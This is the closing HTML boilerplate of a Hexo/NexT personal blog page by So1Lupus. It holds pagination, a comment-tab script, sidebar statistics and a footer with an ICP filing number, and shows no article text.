      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">So1Lupus</p>
  <div class="site-description" itemprop="description">So1Lupus的个人博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">18</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2022029346号 </a>
  </div>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">So1Lupus</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
